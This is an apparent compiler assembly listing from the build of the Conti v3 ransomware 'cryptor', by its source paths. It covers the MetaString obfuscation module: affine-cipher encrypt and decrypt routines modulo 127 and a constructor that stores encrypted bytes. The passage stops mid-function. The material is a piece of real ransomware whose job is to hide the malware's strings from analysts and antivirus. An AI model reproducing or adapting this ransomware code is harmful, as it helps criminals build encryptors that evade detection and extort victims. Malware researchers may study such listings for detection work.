  000b3	c6 41 2d 13	 mov	 BYTE PTR [rcx+45], 19
  000b7	c6 41 2e 24	 mov	 BYTE PTR [rcx+46], 36	; 00000024H
  000bb	c6 41 2f 0b	 mov	 BYTE PTR [rcx+47], 11
  000bf	c6 41 30 02	 mov	 BYTE PTR [rcx+48], 2
  000c3	c6 41 31 17	 mov	 BYTE PTR [rcx+49], 23
  000c7	c6 41 32 6f	 mov	 BYTE PTR [rcx+50], 111	; 0000006fH
  000cb	c6 41 33 60	 mov	 BYTE PTR [rcx+51], 96	; 00000060H
  000cf	c6 41 34 63	 mov	 BYTE PTR [rcx+52], 99	; 00000063H
  000d3	c6 41 35 0b	 mov	 BYTE PTR [rcx+53], 11
  000d7	c6 41 36 32	 mov	 BYTE PTR [rcx+54], 50	; 00000032H
  000db	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  000df	48 8b c1	 mov	 rax, rcx
  000e2	c3		 ret	 0
??0?$MetaBuffer@$02$0DC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::MetaBuffer<3,50,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 77 00 00 00	 mov	 ecx, 119		; 00000077H
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 17	 imul	 r8d, ecx, 23

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 0b	 imul	 r8d, eax, 11
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 77	 add	 r8d, 119		; 00000077H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0L@$0HH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<11,119,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 52	 sub	 eax, 82			; 00000052H
  00006	44 6b c0 19	 imul	 r8d, eax, 25

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 3d	 imul	 r8d, eax, 61		; 0000003dH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 52	 add	 r8d, 82			; 00000052H
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0FC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,82,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	83 e8 49	 sub	 eax, 73			; 00000049H
  00006	44 6b c0 07	 imul	 r8d, eax, 7

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0000f	41 f7 e8	 imul	 r8d
  00012	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00017	41 03 d0	 add	 edx, r8d
  0001a	c1 fa 06	 sar	 edx, 6
  0001d	8b ca		 mov	 ecx, edx
  0001f	c1 e9 1f	 shr	 ecx, 31
  00022	03 d1		 add	 edx, ecx
  00024	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00027	44 2b c1	 sub	 r8d, ecx
  0002a	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  0002e	41 f7 e8	 imul	 r8d
  00031	41 03 d0	 add	 edx, r8d
  00034	c1 fa 06	 sar	 edx, 6
  00037	8b ca		 mov	 ecx, edx
  00039	c1 e9 1f	 shr	 ecx, 31
  0003c	03 d1		 add	 edx, ecx
  0003e	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00041	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00044	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  00048	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<109,73,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0GN@$0EJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
